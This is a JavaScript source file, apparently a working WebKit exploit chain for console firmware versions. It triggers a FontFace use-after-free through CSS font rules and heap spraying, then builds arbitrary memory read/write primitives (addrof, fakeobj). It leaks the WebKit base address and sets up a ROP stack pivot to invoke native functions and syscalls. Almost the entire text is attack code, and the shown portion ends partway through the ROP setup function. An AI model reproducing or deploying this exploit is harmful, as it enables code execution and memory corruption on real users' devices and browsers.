//#region Constants
// used for rop
const fn = {};
const structs = new Map();
const syscalls = new Map();

// used for errno
let _error_addr = undefined;
let strerror_addr = undefined;

// used for base addrs
let webkit_base = undefined;
let libc_base = undefined;
let libkernel_base = undefined;

const mem = {
  allocs: new Set(),
  alloc(len, ptr = true) {
    const ab = new ArrayBuffer(len);
    this.allocs.add(ab);
    return ptr ? ab.data() : ab;
  },
  free(ab) {
    return this.allocs.delete(ab);
  },
  free_all() {
    for (const ab of this.allocs) {
      // fix to avoid crash
      if (ab.hasOwnProperty("m_data")) {
        const ab_addr = arw.addrof(ab);

        let m_impl = arw.view(ab_addr).getBInt(0x10, true);

        if (version.major === 6) {
          m_impl = m_impl.xor(g_JSArrayBufferPoison);
        }

        arw.view(m_impl).setBInt(0, 0, true); // DeferrableRefCountedBase::m_refCount
        arw.view(m_impl).setBInt(constants.wk_ArrayBuffer_m_contents_m_data, ab.m_data, true); // m_contents.m_data

        // m_contents.m_sizeInBytes
        if (version.major === 9) {
          arw.view(m_impl).setInt32(constants.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
        } else {
          arw.view(m_impl).setBInt(constants.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
        }
      }
    }

    this.allocs.clear();
  },
  copy(dst, src, len) {
    const src_u8 = new Uint8Array(ArrayBuffer.from(src, len));
    const dst_u8 = new Uint8Array(ArrayBuffer.from(dst, len));

    dst_u8.set(src_u8);
  },
  bset(addr, len, value = 0) {
    const u8 = new Uint8Array(ArrayBuffer.from(addr, len));
    u8.fill(value);
  },
  strlen(addr, max = 0x3fff) {
    const u8 = new Uint8Array(ArrayBuffer.from(addr, max));

    const len = u8.indexOf(0);
    if (len === -1) {
      throw new Error("Invalid null-terminated string !!");
    }

    return len;
  },
};
const arw = {
  leak: { obj: 0 },
  leak_addr: undefined,
  master: undefined,
  victim: new DataView(new ArrayBuffer(0x30)),
  view(addr) {
    if (addr.eq(0)) {
      throw new Error("Empty addr !!");
    }

    this.master[4] = addr.lo;
    this.master[5] = addr.hi;

    return this.victim;
  },
  addrof(obj) {
    this.leak.obj = obj;
    return this.view(this.leak_addr).getBInt(0x10, true);
  },
  fakeobj(addr) {
    this.view(this.leak_addr).setBInt(0x10, addr, true);
    return this.leak.obj;
  },
};
const rop = {
  stack: undefined,
  frame: undefined,
  pivot: undefined,
  insts: [],
  reset() {
    this.stack.reset();
    this.frame.reset();
  },
  execute() {
    rop.frame.set_value("jmp_rax", gadgets.POP_RAX_RET);

    this.stack.prepare(this.insts, this.frame);
    this.pivot.prepare(this.stack.sp);

    const pivot_obj = {};
    const pivot_obj_addr = arw.addrof(pivot_obj);

    const empty_jscell = arw.view(pivot_obj_addr).getBInt(0, true);

    const pivot_addr = this.pivot.addr;
    arw.view(pivot_obj_addr).setBInt(0, pivot_addr, true);

    Math.expm1(pivot_obj);

    arw.view(pivot_obj_addr).setBInt(0, empty_jscell, true);
  },
};
const gadgets = new Proxy(constants, {
  get(target, prop) {
    return webkit_base + target[`wk_${prop}`];
  },
});
//#endregion
//#region Classes
class SyscallError extends Error {
  constructor(message) {
    super(`${message}\n\terrno ${errno()}: ${strerror()}`);
    this.name = "SyscallError";
  }
}
class Stack {
  constructor(size) {
    if (size % 8 !== 0) {
      throw new Error("Invalid stack size, not aligned by 8 bytes");
    }

    if (size < 0x1000) {
      throw new Error("Invalid stack size, minimal size is 0x1000 to init ROP");
    }

    this.view = new DataView(new ArrayBuffer(size));
    this.reset();
  }

  reset() {
    new Uint8Array(this.view.buffer).fill(0);
    this.offset = this.view.byteLength;
  }

  get sp() {
    return this.view.buffer.data().add(this.offset);
  }

  /**
   * @param {Array} insts
   * @param {Frame} frame
   */
  prepare(insts, frame) {
    this.reset();

    for (let i = insts.length - 1; i >= 0; i--) {
      if (this.current < 1) {
        throw new Error("Stack full !!");
      }

      let inst = insts[i];

      if (typeof inst === "string") {
        if (typeof frame === "undefined") {
          throw new Error("Unable to resolve symbol without frame !!");
        }

        inst = frame.instof(inst);
      }

      this.offset -= 8;
      this.view.setBInt(this.offset, inst, true);
    }
  }
}
class Frame {
  constructor(list) {
    if (!Array.isArray(list)) {
      throw new Error(`Input frame is not an array !!`);
    }

    if (list.length === 0) {
      throw new Error("Empty frame length !!");
    }

    this.pop_view = new DataView(new ArrayBuffer(8));
    this.view = new DataView(new ArrayBuffer(list.length * 8));

    for (let i = 0; i < list.length; i++) {
      const name = list[i];

      if (typeof name !== "string") {
        throw new TypeError(`${name} not a string !!`);
      }

      if (name in this) {
        throw new Error(`Duplicated local variable ${name} !!`);
      }

      this[name] = i;
    }
  }

  reset() {
    new Uint8Array(this.view.buffer).fill(0);
  }

  instof(name) {
    let as_value = false;

    if (name.startsWith("[") && name.endsWith("]")) {
      name = name.slice(1, -1);
      as_value = true;
    }

    if (name in this) {
      return as_value ? this.get_value(name) : this.addrof(name);
    }

    throw new Error(`${name} not in frame !!`);
  }

  addrof(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.view.buffer.data().add(this[name] * 8);
  }

  get_value(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.view.getBInt(this[name] * 8, true);
  }

  set_value(name, value) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    this.view.setBInt(this[name] * 8, value, true);
  }

  valueof(insts, name) {
    insts.push(`[${name}]`);
  }

  store(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_RDI_RET);
    insts.push(name);
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  }

  load(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_RDI_RET);
    insts.push(name);
    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET);
  }

  pop(insts, gadget, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_RAX_RET);
    insts.push(gadget);
    insts.push(gadgets.POP_RDI_RET);
    insts.push(this.pop_view.buffer.data());
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    insts.push(gadgets.POP_RBX_RET);
    insts.push(name);
    insts.push(gadgets.POP_RAX_RET);
    insts.push(this.pop_view.buffer.data());
    insts.push(gadgets.PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX);
  }
}
class Pivot {
  constructor() {
    this.store_view = new DataView(new ArrayBuffer(constants.store_view_size));
    this.pivot_view = new DataView(new ArrayBuffer(0x28));

    this.store_view.setBInt(constants.store_view_entry, gadgets.POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18, true);
    this.store_view.setBInt(0x10, gadgets.MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20, true);
    this.store_view.setBInt(0x18, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);

    if (version.major === 6 && version.minor <= 0x20) {
      this.pivot_view.setBInt(8, gadgets.PUSH_RDI_POP_RSP_RET, true);
      this.pivot_view.setBInt(0x20, gadgets.MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8, true);
    } else {
      this.pivot_view.setBInt(0x10, gadgets.PUSH_RDX_POP_RSP_RET, true);
      this.pivot_view.setBInt(0x20, gadgets.MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);
    }
  }

  get addr() {
    return this.store_view.buffer.data();
  }

  prepare(sp) {
    this.store_view.setBInt(8, this.pivot_view.buffer.data(), true);

    this.pivot_view.setBInt(0, this.pivot_view.buffer.data(), true);
    this.pivot_view.setBInt(constants.pivot_view_sp, sp, true);
  }
}
class NativeFunction {
  constructor(input, ret) {
    this.ret = ret;

    if (input instanceof BInt) {
      this.addr = input;
    } else if (typeof input === "number") {
      if (!syscalls.has(input)) {
        throw new Error(`Syscall ${input} not found !!`);
      }

      this.addr = syscalls.get(input);
    }
  }

  invoke() {
    if (arguments.length > 6) {
      throw new Error("More than 6 arguments is not supported !!");
    }

    rop.reset();

    rop.frame.set_value("rip", this.addr);
    rop.frame.set_value("rax", 0);

    const ctx = [];
    const regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"];

    for (let i = 0; i < regs.length; i++) {
      const reg = regs[i];

      let value = i in arguments ? arguments[i] : 0;

      switch (typeof value) {
        case "boolean":
        case "number":
          break;
        case "string":
          value = value.cstr();
          ctx.push(value);
          break;
        default:
          if (!(value instanceof BInt)) {
            throw new Error(`Invalid value of type ${typeof value} at arg ${i}`);
          }
      }

      rop.frame.set_value(reg, value);
    }

    rop.execute();

    while (ctx.length > 0) {
      mem.free(ctx.pop());
    }

    let result;
    if (this.ret) {
      result = rop.frame.get_value("rax");

      switch (this.ret) {
        case "bint":
          break;
        case "number":
          result = result.i;
          break;
        case "boolean":
          result = result.eq(1);
          break;
        case "string":
          result = String.from(result);
          break;
        default:
          throw new Error(`Unsupported return type ${this.ret}`);
      }
    }

    return result;
  }

  chain() {
    if (arguments.length < 1) {
      throw new Error("insts argument is required to chain with !!");
    }

    if (!Array.isArray(arguments[0])) {
      throw new Error(`insts argument is not an array !!`);
    }

    if (arguments.length > 7) {
      throw new Error("More than 6 arguments is not supported !!");
    }

    const regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_RET];

    const insts = arguments[0];

    insts.push(gadgets.POP_RAX_RET);
    insts.push(0);

    for (let i = 1; i < arguments.length; i++) {
      const reg = regs[i - 1];

      insts.push(reg);

      let value = arguments[i];

      switch (typeof value) {
        case "boolean":
        case "number":
          break;
        case "string":
          value = value.cstr();
          break;
        default:
          if (!(value instanceof BInt)) {
            throw new Error(`Invalid value at arg ${i - 1}`);
          }
      }

      insts.push(value);
    }

    //if (insts.length % 2 === 0) {
    //  insts.push(gadgets.RET); // alignment for xmm/ymm
    //}

    insts.push(this.addr);

    //if (insts.length % 2 === 0) {
    //  insts.push(gadgets.RET); // alignment for xmm/ymm
    //}
  }
}
class Struct {
  constructor(name, fields) {
    if (structs.has(name)) {
      return structs.get(name);
    }

    if (!Array.isArray(fields)) {
      throw new Error("Input fields is not an array !!");
    }

    if (fields.length === 0) {
      throw new Error("Empty fields array !!");
    }

    let offset = 0;
    let alignof = 1;

    this.fields = {};

    for (const field of fields) {
      field.size = Struct.type_size(field.type);
      field.align = Struct.type_align(field.type);
      field.offset = offset = offset.alignUp(field.align);
      field.count = field.count || 1;

      offset += field.size * field.count;
      alignof = Math.max(alignof, field.align);

      this.fields[field.name] = field;
    }

    this.name = name;
    this.sizeof = offset.alignUp(alignof);
    this.alignof = alignof;

    logger.debug(`registering ${this.name}: sizeof: ${this.sizeof}, alignof: ${this.alignof}`);

    structs.set(this.name, this);
  }

  new(addr) {
    const instance = { addr: addr === undefined ? mem.alloc(this.sizeof) : addr, struct: this };
    return new Proxy(instance, {
      get: (target, prop) => {
        if (prop in target) return target[prop];

        if (!isNaN(prop)) {
          const i = Number(prop);
          return target.struct.new(target.addr.add(i * target.struct.sizeof));
        }

        const field = target.struct.fields[prop];
        if (!field) return undefined;

        let type = field.type;
        let addr = target.addr.add(field.offset);

        if (field.count > 1) {
          const size = field.size * field.count;
          const buf = ArrayBuffer.from(addr, size);

          switch (type) {
            case "Int8":
              return new Int8Array(buf);
            case "Uint8":
              return new Uint8Array(buf);
            case "Int16":
              return new Int16Array(buf);
            case "Uint16":
              return new Uint16Array(buf);
            case "Int32":
              return new Int32Array(buf);
            case "Uint32":
              return new Uint32Array(buf);
            case "Int64":
            case "Uint64":
              throw new Error(`type ${field.type} not supported !!`);
            default:
              throw new Error(`Invalid type ${field.type}`);
          }
        } else {
          if (type.endsWith("*")) {
            type = type.slice(0, -1);
            addr = arw.view(target.addr).getBInt(field.offset, true);
          }

          if (structs.has(type)) {
            const struct = structs.get(type);
            return struct.new(addr);
          }

          switch (type) {
            case "Int8":
              return arw.view(addr).getInt8(0, true);
            case "Uint8":
              return arw.view(addr).getUint8(0, true);
            case "Int16":
              return arw.view(addr).getInt16(0, true);
            case "Uint16":
              return arw.view(addr).getUint16(0, true);
            case "Int32":
              return arw.view(addr).getInt32(0, true);
            case "Uint32":
              return arw.view(addr).getUint32(0, true);
            case "Int64":
            case "Uint64":
              return arw.view(addr).getBInt(0, true);
            default:
              throw new Error(`Invalid type ${field.type}`);
          }
        }
      },
      set: (target, prop, value) => {
        if (!isNaN(prop)) {
          const i = Number(prop);
          if (!value.hasOwnProperty("struct")) {
            throw new Error("Value is not a Struct");
          }

          if (target.struct.name !== value.struct.name) {
            throw new Error(`Expected ${target.struct.name} got ${value.struct.name} !!`);
          }

          mem.copy(target.addr + i * target.struct.sizeof, value.addr, target.struct.sizeof);
        } else {
          const field = target.struct.fields[prop];
          if (!field) return undefined;

          let type = field.type;
          let addr = target.addr.add(field.offset);

          if (field.count > 1) {
            const size = field.size * field.count;

            if (!ArrayBuffer.isView(value)) {
              throw new Error("Value is not a TypedArray");
            }

            if (value.buffer.byteLength !== size) {
              throw new Error(`Expected ${size} bytes got ${value.buffer.byteLength} !!`);
            }

            mem.copy(addr, value.buffer.getBackingStore(), size);
          } else {
            if (type.endsWith("*")) {
              if (!(value instanceof BInt)) {
                throw new Error("Value is not a pointer");
              }

              arw.view(target.addr).setBInt(field.offset, value, true);
              return;
            }

            if (structs.has(type)) {
              const struct = structs.get(type);

              if (!value.hasOwnProperty("addr")) {
                throw new Error("Value is not a Struct");
              }

              mem.copy(addr, value.addr, struct.sizeof);
              return;
            }

            switch (type) {
              case "Int8":
                arw.view(addr).setInt8(0, value, true);
                break;
              case "Uint8":
                arw.view(addr).setUint8(0, value, true);
                break;
              case "Int16":
                arw.view(addr).setInt16(0, value, true);
                break;
              case "Uint16":
                arw.view(addr).setUint16(0, value, true);
                break;
              case "Int32":
                arw.view(addr).setInt32(0, value, true);
                break;
              case "Uint32":
                arw.view(addr).setUint32(0, value, true);
                break;
              case "Int64":
              case "Uint64":
                arw.view(addr).setBInt(0, value, true);
                break;
              default:
                throw new Error(`Invalid type ${field.type}`);
            }
          }
        }

        return true;
      },
    });
  }

  static type_size(type) {
    if (type.endsWith("*")) {
      return 8;
    } else if (structs.has(type)) {
      return structs.get(type).sizeof;
    } else {
      return Struct.primitive_size(type);
    }
  }

  static type_align(type) {
    if (type.endsWith("*")) {
      return 8;
    } else if (structs.has(type)) {
      return structs.get(type).alignof;
    } else {
      return Struct.primitive_size(type);
    }
  }

  static primitive_size(type) {
    const bits = type.replace(/\D/g, "");
    if (bits % 8 !== 0) {
      throw new Error(`Invalid primitive type ${type}`);
    }

    return bits / 8;
  }
}
//#endregion
//#region Extensions

ArrayBuffer.prototype.data = function () {
  const ab_addr = arw.addrof(this);

  let m_impl = arw.view(ab_addr).getBInt(0x10, true);

  if (version.major === 6) {
    m_impl = m_impl.xor(g_JSArrayBufferPoison);
  }

  return arw.view(m_impl).getBInt(constants.wk_ArrayBuffer_m_contents_m_data, true); // m_data
};

String.prototype.cstr = function () {
  const ab = mem.alloc(this.length + 1, false);
  const u8 = new Uint8Array(ab);

  for (let i = 0; i < this.length; i++) {
    u8[i] = this.charCodeAt(i) & 0xff;
  }

  u8[this.length] = 0;

  return ab.data();
};
//#endregion
//#region Static
String.from = function (addr, len) {
  if (addr.eq(0)) return "";

  len = len || mem.strlen(addr);

  if (len === 0) return "";

  const u8 = new Uint8Array(len);

  mem.copy(u8.buffer.data(), addr, len);

  return new TextDecoder().decode(u8);
};

ArrayBuffer.from = function (addr, len = -1) {
  if (addr.eq(0)) {
    throw new RangeError("Empty addr !!");
  }

  const ab = mem.alloc(0, false);
  const ab_addr = arw.addrof(ab);

  let m_impl = arw.view(ab_addr).getBInt(0x10, true);

  if (version.major === 6) {
    m_impl = m_impl.xor(g_JSArrayBufferPoison);
  }

  const m_data = arw.view(m_impl).getBInt(0x10, true);

  ab.m_data = m_data;

  arw.view(m_impl).setBInt(0, 2, true); // DeferrableRefCountedBase::m_refCount
  arw.view(m_impl).setBInt(constants.wk_ArrayBuffer_m_contents_m_data, addr, true); // m_contents.m_data

  // m_contents.m_sizeInBytes
  if (version.major === 9) {
    arw.view(m_impl).setInt32(constants.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
  } else {
    arw.view(m_impl).setBInt(constants.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
  }

  return ab;
};
//#endregion
//#region Functions
function errno() {
  if (!fn.hasOwnProperty("_error")) {
    throw new Error("_error undefined !!");
  }

  return arw.view(fn._error.invoke()).getUint32(0, true);
}

function strerror() {
  if (!fn.hasOwnProperty("_strerror")) {
    throw new Error("strerror undefined !!");
  }

  return fn._strerror.invoke(errno());
}

function sleep(ms = 0) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function nsleep(nsec) {
  const time = timespec.new();

  time.tv_sec = Math.floor(nsec / 1e9);
  time.tv_nsec = nsec % 1e9;

  if (fn.nanosleep.invoke(time.addr) === -1) {
    throw new SyscallError(`Unable to sleep for ${nsec} nano seconds !!`);
  }

  mem.free(time.addr);
}

async function init_rw() {
  logger.info("Initiate UAF...");

  const spray_count = 0xb0;
  const spray_font_rule = `
    @font-face {
      font-family: spray;
      src: local(Helvetica Bold);
      unicode-range: U+0043;
    }
  `;
  const uaf_font_rule = `
    @font-face {
      font-family: b;
      src: url(nonexistent-font.woff);
      unicode-range: U+0042;
    }
  `;

  const abs = new Array(spray_count);

  // FontFace A with a local source so it resolves synchronously
  const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });

  document.fonts.add(A);

  // Register a DeferredPromise on A
  void A.loaded;

  const style = document.createElement("style");
  document.head.appendChild(style);

  // Shape heap around B in order to reclaim it after free
  for (let i = 0; i < spray_count / 4; i++) {
    style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
  }

  // FontFace B with a remote source so it resolves asynchronously
  const uaf_font_rule_index = style.sheet.cssRules.length;
  style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);

  // Shape heap around B in order to reclaim it after free
  for (let i = spray_count / 4; i < spray_count; i++) {
    style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
  }

  // Forces style recalculation and FontFace instantiation
  document.body.offsetTop;

  const old_then = FontFace.prototype.then;

  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (this === A) {
        // Free B while FontFaceSet::load still holds a raw reference to it in matchingFaces
        style.sheet.deleteRule(uaf_font_rule_index);

        // Forces style recalculation and FontFace deconstruction
        document.body.offsetTop;

        // Free B's neighbours
        for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
          const rule = style.sheet.cssRules[i];

          if (rule.cssText.includes("spray")) {
            style.sheet.deleteRule(i);
          }
        }

        // Forces style recalculation and FontFace deconstruction
        document.body.offsetTop;

        // Spray ArrayBuffer with FontFace size and populate it so it survives crash
        for (let i = 0; i < abs.length; i++) {
          const ab = new ArrayBuffer(constants.wk_CSSFontFace_sizeof);
          const view = new DataView(ab);

          view.setBInt(8, 1, true); // ref count
          view.setUint8(constants.wk_CSSFontFace_m_status, 3); // m_status: Status::Success

          abs[i] = ab;
        }
      }

      return undefined;
    },
  });

  // Loading 'AB' needs both U+0041 (from A) and U+0042 (from the CSS rule)
  // A resolves synchronously, firing the thenable check getter above
  const fonts = await document.fonts.load("1em a, b", "AB");

  logger.debug(`fonts: ${fonts}`);

  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    value: old_then,
  });

  // Check if both A and B are loaded
  if (fonts.length !== 2) {
    throw new Error("Unable to reclaim UAF FontFace !!");
  }

  logger.info("UAF Achieved !!");

  let uaf_ab = undefined;
  let uaf_font = undefined;

  // UAF FontFace has default unicodeRange value U+0-10FFFF
  for (const font of fonts) {
    if (font.unicodeRange === "U+0-10FFFF") {
      logger.info("Found UAF FontFace !!");
      uaf_font = font;
      break;
    }
  }

  if (uaf_font === undefined) {
    throw new Error("Unable to find UAF error !!");
  }

  fonts.length = 0;

  // UAF ArrayBuffer has ref count of 2 due to FontFace return to script
  for (const ab of abs) {
    const view = new DataView(ab);
    if (view.getBInt(8, true).eq(2)) {
      logger.info("Found ArrayBuffer of UAF FontFace !!");
      uaf_ab = ab;
      break;
    }
  }

  if (uaf_ab === undefined) {
    throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
  }

  abs.length = 0;

  return {
    uaf_ab: uaf_ab,
    uaf_font: uaf_font,
    leak: { obj: 0 },
    leak_addr: undefined,
    read(addr, size) {
      const ab = new ArrayBuffer(size);
      const u8 = new Uint8Array(ab);

      const uaf_view = new DataView(this.uaf_ab);

      let offset = 0;
      while (offset < size) {
        const ptr = addr.add(offset);

        uaf_view.setBInt(constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true); // m_featureSettings.m_buffer
        uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true); // m_featureSettings.m_size
        uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true); // m_featureSettings.m_capacity

        // read m_tag since its std::array<char, 4> and skip the " chars
        for (let i = 1; i < 5; i++) {
          u8[offset++] = this.uaf_font.featureSettings.charCodeAt(i);
        }
      }

      return ab;
    },
    read8(addr) {
      const ab = this.read(addr, 8);
      const view = new DataView(ab);
      return view.getBInt(0, true);
    },
    addrof(obj) {
      this.leak.obj = obj;
      return this.read8(this.leak_addr.add(0x10));
    },
  };
}

async function init_arw(rw) {
  logger.info("Initiate ARW...");

  if (rw !== undefined) {
    // setup arw using rw
    const uaf_view = new DataView(rw.uaf_ab);

    const m_clients = uaf_view.getBInt(constants.wk_CSSFontFace_m_clients, true);
    const m_wrapper = uaf_view.getBInt(constants.wk_CSSFontFace_m_wrapper, true);

    logger.debug(`m_clients: ${m_clients}`);
    logger.debug(`m_wrapper: ${m_wrapper}`);

    const m_wrapper_m_ptr = rw.read8(m_wrapper.add(8));
    logger.debug(`m_wrapper_m_ptr: ${m_wrapper_m_ptr}`);

    const m_backing = rw.read8(m_wrapper_m_ptr.add(constants.wk_FontFace_m_backing));
    logger.debug(`m_backing: ${m_backing}`);

    const props = [];
    const marker = 0x41414141;

    // Spray marker and target JS object as props
    for (let i = 0; i < 0x100; i++) {
      props.push({ value: marker });
      props.push({ value: rw.leak });
    }

    let found = false;
    let start = m_backing.alignUp(0x4000);

    while (true) {
      // Allocates Vector<PropertyDescriptor> and MarkedArgumentBuffer, both of which uses fastMalloc which will spray our props into fastMalloc heap
      Object.defineProperties({}, props);

      const dv = new DataView(rw.read(start, 0x100));

      for (let i = 0; i < dv.byteLength / 8; i += 8) {
        if (dv.getUint32(i, true) === marker && dv.getUint32(i + 0x18, true) === 0xe) {
          const marker_addr = start.add(i);
          logger.info(`Found Array marker at ${marker_addr} !!`);

          rw.leak_addr = rw.read8(marker_addr.add(0x20));
          logger.debug(`rw_leak_addr: ${rw.leak_addr}`);

          found = true;
          break;
        }
      }

      if (found) {
        break;
      }

      start = start.add(0x100);
    }

    const rw_leak_obj_addr = rw.leak_addr.add(0x10);
    logger.debug(`rw_leak_obj_addr: ${rw_leak_obj_addr}`);

    arw.leak_addr = rw.addrof(arw.leak);
    logger.debug(`arw_leak_addr: ${arw.leak_addr}`);

    const dummy_view = new Uint32Array(1);
    const dummy_view_addr = rw.addrof(dummy_view);
    logger.debug(`dummy_view_addr: ${dummy_view_addr}`);

    const dummy_view_jscell = rw.read8(dummy_view_addr);
    logger.debug(`dummy_view_jscell: ${dummy_view_jscell}`);

    // Prepare container's properties to be used with fakeobj to create arw.master view over arw.victim DataView
    const container = {
      jscell: dummy_view_jscell.d, // NaN-boxed, fix later
      butterfly: null, // becomes 0x2, fix later
      vector: arw.victim,
    };

    if (version.major >= 10) {
      container.length = false; // becomes 0x6, fix later
      container.flags = null; // becomes 0x2, fix later
    } else {
      container.length_and_flags = false; // becomes 0x6, fix later
    }

    const container_addr = rw.addrof(container);
    logger.debug(`container_addr: ${container_addr}`);

    const fake_addr = container_addr.add(0x10);
    logger.debug(`fake_addr: ${fake_addr}`);

    const dummy_font = new FontFace("spray", "local(Helvetica)", {});
    const dummy_font_addr = rw.addrof(dummy_font);
    logger.debug(`dummy_font_addr: ${dummy_font_addr}`);

    const font_addr = rw.read8(dummy_font_addr.add(0x18));
    logger.debug(`font_addr: ${font_addr}`);

    const css_font_addr = rw.read8(font_addr.add(constants.wk_FontFace_m_backing));
    logger.debug(`css_font_addr: ${css_font_addr}`);

    const css_font_vtable = rw.read8(css_font_addr);
    logger.debug(`css_font_vtable: ${css_font_vtable}`);

    const m_thread = rw.read8(css_font_addr.add(constants.wk_CSSFontFace_m_thread));
    logger.debug(`m_thread: ${m_thread}`);

    webkit_base = css_font_vtable.sub(constants.wk_CSSFontFace_vtable);
    logger.info(`webkit_base: ${webkit_base}`);

    // Craft a fake vtable to perform a fakeobj write of fake_addr to rw.leak.obj
    const fake_obj = new DataView(new ArrayBuffer(0x20));
    const fake_vtable = new DataView(new ArrayBuffer(0x10));

    const fake_obj_addr = rw.addrof(fake_obj);
    const fake_vtable_addr = rw.addrof(fake_vtable);

    const fake_obj_m_vector = rw.read8(fake_obj_addr.add(0x10));
    const fake_vtable_m_vector = rw.read8(fake_vtable_addr.add(0x10));

    let fake_vtable_gadget;
    let dst_addr_offset;

    if (version.major >= 10) {
      fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2060_RAX_RET;
      dst_addr_offset = 0x2060;
    } else if (version.major >= 9) {
      fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2330_RAX_RET;
      dst_addr_offset = 0x2330;
    } else if (version.major >= 7) {
      fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_21d8_RAX_RET;
      dst_addr_offset = 0x21d8;
    } else if (version.major >= 6) {
      fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2238_RAX_RET;
      dst_addr_offset = 0x2238;
    }

    fake_vtable.setBInt(8, fake_vtable_gadget, true);

    fake_obj.setBInt(0, fake_vtable_m_vector, true);
    fake_obj.setBInt(8, fake_addr, true);
    fake_obj.setBInt(0x10, rw_leak_obj_addr.sub(dst_addr_offset), true);

    // Needed to survive crash from calling CSSFontFaceSet::add/CSSFontFaceSet::remove
    uaf_view.setUint8(constants.wk_CSSFontFace_m_status, 4); // m_status: Status::Failure

    document.fonts.add(rw.uaf_font);

    // Prepare UAF FontFace to be freed on CSSFontFaceSet::remove call and execute our fake vtable
    new Uint8Array(uaf_view.buffer).fill(0);

    uaf_view.setBInt(0, css_font_vtable, true); // valid vtable
    uaf_view.setBInt(8, 1, true); // ref count
    uaf_view.setBInt(constants.wk_CSSFontFace_m_clients, m_clients, true); // m_clients
    uaf_view.setBInt(constants.wk_CSSFontFace_m_wrapper, m_wrapper, true); // m_wrapper
    uaf_view.setUint8(constants.wk_CSSFontFace_m_status, 4); // m_status: Status::Failure
    uaf_view.setBInt(constants.wk_CSSFontFace_m_thread, m_thread, true); // m_thread
    uaf_view.setBInt(constants.wk_CSSFontFace_m_function, fake_obj_m_vector, true); // m_function

    document.fonts.delete(rw.uaf_font);

    // Cleanup UAF
    new Uint8Array(uaf_view.buffer).fill(0);

    // Return crafted fakeobj from container to script
    const fake = rw.leak.obj;

    // Set victim's vector to fake_addr
    fake[4] = fake_addr.lo;
    fake[5] = fake_addr.hi;

    // Fix NaN-boxing values from earlier
    arw.victim.setBInt(0, dummy_view_jscell, true); // jscell
    arw.victim.setBInt(8, 0, true); // butterfly

    // TypedArrayMode::OversizeTypedArray
    if (version.major >= 10) {
      arw.victim.setBInt(constants.wk_TypedArray_flags, 1, true);
    } else {
      arw.victim.setUint32(constants.wk_TypedArray_flags, 1, true);
    }

    // Create new view as TypedArrayMode::WastefulTypedArray using fake.buffer that points to arw.victim and no longer depends on container's lifetime
    arw.master = new Uint32Array(fake.buffer);
  }

  const victim_addr = arw.addrof(arw.victim);
  logger.debug(`victim_addr: ${victim_addr}`);

  // Set arw.victim's length to max
  if (version.major >= 10) {
    arw.view(victim_addr).setBInt(0x18, -1, true);
  } else {
    arw.view(victim_addr).setInt32(0x18, -1, true);
  }

  if (version.major === 6) {
    g_JSArrayBufferPoison = arw.view(webkit_base).getBInt(constants.wk_g_JSArrayBufferPoison, true);
    g_JSFunctionPoison = arw.view(webkit_base).getBInt(constants.wk_g_JSFunctionPoison, true);
    g_NativeCodePoison = arw.view(webkit_base).getBInt(constants.wk_g_NativeCodePoison, true);
  }

  logger.info("Achieved ARW !!");
}

function init_rop() {
  logger.info("Initiate ROP...");

  const math_expm1_addr = arw.addrof(Math.expm1);
  logger.debug(`math_expm1_addr: ${math_expm1_addr}`);

  let m_executableOrRareData = arw.view(math_expm1_addr).getBInt(0x18, true);

  if (version.major === 6) {
    m_executableOrRareData = m_executableOrRareData.xor(g_JSFunctionPoison);
  }

  logger.debug(`m_executableOrRareData: ${m_executableOrRareData}`);

  logger.info(`webkit base: ${webkit_base}`);

  strerror_addr = arw.view(webkit_base).getBInt(constants.wk___imp_strerror, true);
